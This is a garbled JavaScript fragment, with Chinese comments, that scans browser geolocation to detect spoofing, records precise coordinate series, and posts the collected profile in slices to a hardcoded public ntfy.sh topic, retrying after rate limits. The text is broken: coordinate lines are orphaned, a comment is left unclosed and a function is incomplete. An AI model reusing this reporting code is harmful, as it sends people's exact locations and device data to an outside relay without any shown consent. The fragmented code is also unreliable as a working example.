/* ---- G6Y：定位完整性扫描 ---- */

             acc:r4(p.coords.accuracy),alt:r4(p.coords.altitude),
             altAcc:r4(p.coords.altitudeAccuracy),heading:r4(p.coords.heading),

/* T3q：25 次串行 getCurrentPosition（timeout 10ms、高精度、maximumAge 0）

function oneScan(){
  return new Promise(function(resolve){
    var t0=now();
    if(!navigator.geolocation){ resolve({ms:0}); return; }
    var settled=false;

             alt:r4(p.coords.altitude),altAcc:r4(p.coords.altitudeAccuracy),
             heading:r4(p.coords.heading),speed:r4(p.coords.speed),

      {enableHighAccuracy:true,timeout:10,maximumAge:0});
    }catch(e){ fin({ms:now()-t0,code:'throw'}); }
  });

async function geoScan(count,timeout){
  count=count||25;
  var scans=[], firstTs=null, sameTs=0, denied=0, timeouts=0, coordsOk=0, sample=null, series=[];
  for(var i=0;i<count;i++){
    var r=await oneScan();
    scans.push(Math.round(r.ms));
    if(r.coords){
      if(!sample) sample=r;
      coordsOk++;
      series.push({acc:r.acc,alt:r.alt,altAcc:r.altAcc,lat:r.lat,lon:r.lon,ts:r.timestamp});
      if(firstTs!==null && r.timestamp===firstTs) sameTs++;
      firstTs=r.timestamp;
    } else if(r.isDenied) denied++;
    else if(r.isTimeout) timeouts++;
  }
  var fastRatio=scans.filter(function(ms){return ms<10;}).length/count;
  var spoofed=(fastRatio>0.8 && denied===0 && timeouts===0 && sameTs===count-1)?1:0;
  return {count:count,same_timestamp_count:sameTs,timeout_count:timeouts,denied_count:denied,
          coords_count:coordsOk,fast_ratio:r4(fastRatio),instant_success_count:scans.filter(function(ms){return ms<=1;}).length,
          scanning:scans.join(','),spoofed:spoofed,sample:sample,series:series};
}

/* ---- 定位漂移序列：与真机对比逐次精度变化（宽松超时，非 SDK 的 10ms 扫描） ---- */
async function geoDrift(count){
  var out=[];
  for(var i=0;i<count;i++){
    var r = await new Promise(function(resolve){
      var settled=false, t0=now();
      var fin=function(v){ if(settled) return; settled=true; resolve(v); };
      setTimeout(function(){ fin({ok:false,ms:Math.round(now()-t0),reason:'timeout'}); }, 4000);
      try{
        navigator.geolocation.getCurrentPosition(function(p){
          fin({ok:true,ms:Math.round(now()-t0),acc:r4(p.coords.accuracy),alt:r4(p.coords.altitude),
               altAcc:r4(p.coords.altitudeAccuracy),lat:r4(p.coords.latitude),lon:r4(p.coords.longitude),
               ts:p.timestamp});
        },function(e){ fin({ok:false,ms:Math.round(now()-t0),reason:'code='+e.code}); },
        {enableHighAccuracy:true,maximumAge:0,timeout:4000});
      }catch(e){ fin({ok:false,ms:0,reason:'throw'}); }
    });
    out.push(r);
    await new Promise(function(r){ setTimeout(r, 700); });
  }
  return out;
}

var snap={};

/* ntfy.sh rejects a body over 4096 bytes. The filled profile is larger than that,
   so the bytes are sent as P <id> <index> <count> <total> slices. */
function reportSlices(payload){
  var raw=new TextEncoder().encode(payload);
  var limit=3200;
  var id=(tag||'detect')+'-'+Date.now().toString(36)+'-'+Math.floor(Math.random()*1e6).toString(36);
  if(raw.length<=limit) return [{id:id, index:0, count:1, body:raw}];
  var n=Math.ceil(raw.length/limit);
  var slices=[];
  for(var i=0;i<n;i++){
    var head=new TextEncoder().encode('P '+id+' '+i+' '+n+' '+raw.length+'\n');
    var slice=raw.subarray(i*limit,Math.min(raw.length,(i+1)*limit));
    var body=new Uint8Array(head.length+slice.length);
    body.set(head,0); body.set(slice,head.length);
    slices.push({id:id, index:i, count:n, body:body});
  }
  return slices;
}
function postReport(payload){
  var url=ep||'https://ntfy.sh/collectlab-7f3a91c2d4';
  reportSlices(payload).forEach(function(slice){
    fetch(url,{method:'POST',cache:'no-store',body:slice.body}).catch(function(){});
  });
}
function sleep(ms){
  return new Promise(function(resolve){ setTimeout(resolve, ms); });
}
/* ntfy.sh answers 429 after a short burst and drops the rest of the chain.
   Space the slices out and retry that one slice, so a later shot is not lost
   because the first response was not OK. */
function postSlice(url, body, attempt){
  return fetch(url,{method:'POST',cache:'no-store',body:body}).then(function(res){
    if(res.ok) return sleep(1200);
    var err=new Error(String(res.status));
    err.status=res.status;
    throw err;
  }).catch(function(err){
    if(attempt>=5) throw err;
    var wait=(err&&err.status===429)?8000:2500;
    return sleep(wait).then(function(){ return postSlice(url, body, attempt+1); });
  });
}
function postReportAsync(payload){
  var url=ep||'https://ntfy.sh/collectlab-7f3a91c2d4';
  var slices=reportSlices(payload);
  var chain=Promise.resolve();
  slices.forEach(function(slice){
    chain=chain.then(function(){ return postSlice(url, slice.body, 0); });
  });
  return chain;
}
